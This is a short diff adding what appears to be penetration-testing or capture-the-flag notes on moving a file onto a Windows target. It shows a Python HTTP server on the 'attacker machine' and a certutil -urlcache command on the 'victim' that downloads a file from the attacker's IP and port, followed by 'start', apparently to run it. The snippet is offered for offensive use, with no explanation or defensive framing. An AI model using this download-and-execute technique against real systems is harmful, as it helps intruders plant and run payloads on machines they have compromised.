@@ -1,0 +1,6 @@
+---------Attacker Machine--------
+Python-m SimpleHTTPServer <Port>
+
+---Victim--- 
+Windows: certutil -urlcache -f http://<IP>:<Port>/<filename> <outputfilename>
+  start
